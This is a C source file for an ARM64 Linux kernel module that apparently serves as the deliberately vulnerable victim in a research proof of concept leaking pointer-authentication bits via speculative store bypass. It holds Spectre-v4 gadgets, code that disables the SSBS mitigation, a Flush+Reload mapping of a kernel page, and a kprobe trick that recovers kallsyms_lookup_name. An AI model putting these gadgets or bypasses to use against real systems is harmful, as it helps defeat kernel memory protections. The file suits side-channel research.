// xel victim: an EL2 (VHE) kernel module holding a fresh private value per round whose field [54:48] is the
// secret. One ioctl runs one speculative transmit that forms an address from a chosen field bit and accesses
// it, in range for one bit value and out of range for the other.
#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/vmalloc.h>
#include <linux/preempt.h>
#include <linux/random.h>
#include <linux/mm.h>
#include <linux/kprobes.h>
#include <asm/cacheflush.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Cross-EL 7-bit PAC leak: AUT* sign bit and canonicality (dTLB / iTLB / L1D)");

enum { SW_AUT, SW_CANON };
enum { MEDIUM_L1D, MEDIUM_DTLB, MEDIUM_ITLB };

#define SLED_PAGES 24
#define SECRET_FIELD (0x7fULL << 48)
#define SECRET_P 0x0000007a00000000ULL     // the pointer the victim signs; its PAC field is the secret
static u8  *area = NULL;                  // kernel data page: the dTLB and L1D victim target
static u8  *sled = NULL;                  // executable kernel jump-sled: the iTLB victim target

typedef int (*set_memory_t)(unsigned long, int);
static set_memory_t set_memory_x_fn;
static set_memory_t set_memory_nx_fn;

static __nocfi unsigned long resolve(const char *name) {
    typedef unsigned long (*lookup_t)(const char *);
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    lookup_t lookup = NULL;
    if (register_kprobe(&kp)) {
        return 0;
    }
    lookup = (lookup_t)kp.addr;
    unregister_kprobe(&kp);
    return lookup ? lookup(name) : 0;
}

static u64 value = 0;                      // the round's 64-bit value, field [54:48] is the secret
static volatile u64 canon_signature = 0;             // base with the tested field bit at its position
static volatile u64 canon_mask = 0;             // ORR mask: zero at the tested bit, ones elsewhere in the field
static volatile u64 base_pointer = 0;            // aut base pointer
static volatile u64 aut_field_bit = 0;        // the bit value placed at index 55 (aut)
static volatile u64 gadget_target = 0;

static inline u64 place_bit55(u64 base, u64 bit) {
    return (base & ~(1ULL << 55)) | ((bit & 1ULL) << 55);
}

// canon: the base is a sign-extended kernel address, so the victim ORs the tested field bit back in,
// completing the sign extension (canonical) when the bit is set. Kernel-half mirror of the user-half AND.
static noinline void gadget_load_canon(void) {
    u64 v = canon_signature | canon_mask;
    asm volatile(
        "\t.set o, 0\n\t.rept 16\n\tldr x4, [%0, #o]\n\t.set o, o + 64\n\t.endr\n"
        : "+r"(v) :: "x4", "memory");
}
static noinline void gadget_branch_canon(void) {
    u64 v = canon_signature | canon_mask;
    asm volatile("blr %0" : "+r"(v) :: "x30", "memory");
}
// aut: place the chosen bit at index 55, authenticate, then access. In range iff the bit is 0.
static noinline void gadget_load_aut(void) {
    u64 v = place_bit55(base_pointer, aut_field_bit);
    asm volatile(
        ".arch_extension pauth\n\tautiza %0\n"
        "\t.set o, 0\n\t.rept 16\n\tldr x4, [%0, #o]\n\t.set o, o + 64\n\t.endr\n"
        : "+r"(v) :: "x4", "memory");
}
static noinline void gadget_branch_aut(void) {
    u64 v = place_bit55(base_pointer, aut_field_bit);
    asm volatile(".arch_extension pauth\n\tautiza %0\n\tblr %0" : "+r"(v) :: "x30", "memory");
}

static long spec_flag[512]  __attribute__((aligned(4096))) = { 0 };
static long spec_index[512] __attribute__((aligned(4096))) = { 0 };
static inline void flush_cacheline(void *line) {
    asm volatile("dc civac,%0" :: "r"(line) : "memory");
}
static inline void memory_barrier(void) {
    asm volatile("dsb sy\n isb\n" ::: "memory");
}

static volatile u64 close_window = 0;         // 1 resolves the store before the access, closing the window

// The gadget runs only on the store-bypass transient, so an out-of-range target is fast-rejected.
static inline void v4_gadget(void) {
    spec_flag[0] = 1;
    spec_index[0] = 0;
    flush_cacheline(&spec_index[0]);
    memory_barrier();
    long index = *(volatile long *)&spec_index[0];
    *(volatile long *)&spec_flag[index] = 0;
    if (close_window) {
        asm volatile("dsb sy\n isb\n" ::: "memory");
    }
    if (*(volatile long *)&spec_flag[0]) {
        ((void (*)(void))gadget_target)();
    }
}

static u64 saved_ssbs = 0;
static inline void enable_store_bypass_el2(void) {
    preempt_disable();
    asm volatile("mrs %0, S3_3_C4_C2_6" : "=r"(saved_ssbs));
    asm volatile("msr S3_3_C4_C2_6, %0" :: "r"(saved_ssbs | (1UL << 12)));
    asm volatile("isb");
}
static inline void restore_store_bypass_el2(void) {
    asm volatile("msr S3_3_C4_C2_6, %0" :: "r"(saved_ssbs));
    asm volatile("isb");
    preempt_enable();
}

#define AX_MAGIC 0xBA
struct ax_g {
    __u32 sw;
    __u32 medium;
    __u32 bit;
    __u32 profile;
    __u32 control;
};
#define AX_SETUP  _IO (AX_MAGIC, 0)
#define AX_GADGET _IOW(AX_MAGIC, 1, struct ax_g)
#define AX_REVEAL _IOR(AX_MAGIC, 2, __u64)

static void select_and_form(u32 sw, u32 medium, u32 bit, u32 profile) {
    u64 pos = 48 + (bit & 0x7);                               // the tested field bit, swept from 48 to 54
    u64 fieldbit = (profile <= 1) ? (u64)profile : ((value >> pos) & 1ULL);
    // canon: ORR mask zero at the tested position, ones elsewhere, so the sign extension completes only when
    // the secret bit is set.
    base_pointer = (MEDIUM_ITLB == medium) ? (u64)sled : (u64)&area[0];
    if (SW_CANON == sw) {
        u64 cpos = (MEDIUM_DTLB == medium) ? 48 : pos;   // the dTLB fill gates only on bit 48, so route every bit through 48
        canon_signature = (base_pointer & ~SECRET_FIELD) | (fieldbit << cpos);
        canon_mask = SECRET_FIELD & ~(1ULL << cpos);
        gadget_target = (MEDIUM_ITLB == medium) ? (u64)&gadget_branch_canon : (u64)&gadget_load_canon;
    } else {
        aut_field_bit = fieldbit;
        gadget_target = (MEDIUM_ITLB == medium) ? (u64)&gadget_branch_aut : (u64)&gadget_load_aut;
    }
}

static long ax_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    struct ax_g req = { 0 };
    switch (cmd) {
    case AX_SETUP: {
        u64 ptr = SECRET_P;
        asm volatile(".arch_extension pauth\n\tpacia %0, %1" : "+r"(ptr) : "r"(get_random_u64()));
        value = ptr;                             // a freshly signed pointer, its PAC field is the secret
        return 0;
    }
    case AX_GADGET:
        if (copy_from_user(&req, (void __user *)arg, sizeof req)) {
            return -EFAULT;
        }
        if (req.bit >= 7 || req.sw > SW_CANON || req.medium > MEDIUM_ITLB) {
            return -EINVAL;
        }
        close_window = req.control;
        select_and_form(req.sw, req.medium, req.bit, req.profile);
        enable_store_bypass_el2();
        v4_gadget();
        restore_store_bypass_el2();
        return 0;
    case AX_REVEAL:
        if (copy_to_user((void __user *)arg, &value, sizeof value)) {
            return -EFAULT;
        }
        return 0;
    }
    return -ENOTTY;
}

// Map the victim's L1D target page into the attacker so it can Flush and Reload the shared physical line.
static int ax_mmap(struct file *file, struct vm_area_struct *vma) {
    if (vma->vm_end - vma->vm_start > PAGE_SIZE) {
        return -EINVAL;
    }
    return remap_vmalloc_range(vma, area, 0);
}

static const struct file_operations fops = {
    .owner = THIS_MODULE, .unlocked_ioctl = ax_ioctl, .mmap = ax_mmap
};
static struct miscdevice dev = { .minor = MISC_DYNAMIC_MINOR, .name = "aut_xel", .fops = &fops };

static int __init __nocfi aut_xel_init(void) {
    int page = 0;
    set_memory_x_fn = (set_memory_t)resolve("set_memory_x");
    set_memory_nx_fn = (set_memory_t)resolve("set_memory_nx");
    area = vmalloc_user(PAGE_SIZE);          // user-mappable, so the attacker can Flush and Reload this page
    sled = vmalloc((size_t)SLED_PAGES * PAGE_SIZE);
    if (!area || !sled || !set_memory_x_fn || !set_memory_nx_fn) {
        vfree(area);
        vfree(sled);
        return -ENOMEM;
    }
    area[0] = 1;
    for (page = 0; page < SLED_PAGES; ++page) {
        u32 *head = (u32 *)(sled + (size_t)page * PAGE_SIZE);
        *head = (page + 1 < SLED_PAGES) ? 0x14000400u : 0xD65F03C0u;   // b .+4096 | ret
    }
    flush_icache_range((unsigned long)sled, (unsigned long)sled + (size_t)SLED_PAGES * PAGE_SIZE);
    set_memory_x_fn((unsigned long)sled, SLED_PAGES);
    if (misc_register(&dev)) {
        set_memory_nx_fn((unsigned long)sled, SLED_PAGES);
        vfree(area);
        vfree(sled);
        return -ENODEV;
    }
    pr_info("aut_xel: /dev/aut_xel loaded\n");
    return 0;
}
static void __exit __nocfi aut_xel_exit(void) {
    misc_deregister(&dev);
    set_memory_nx_fn((unsigned long)sled, SLED_PAGES);
    vfree(area);
    vfree(sled);
    pr_info("aut_xel: unloaded\n");
}
module_init(aut_xel_init);
module_exit(aut_xel_exit);
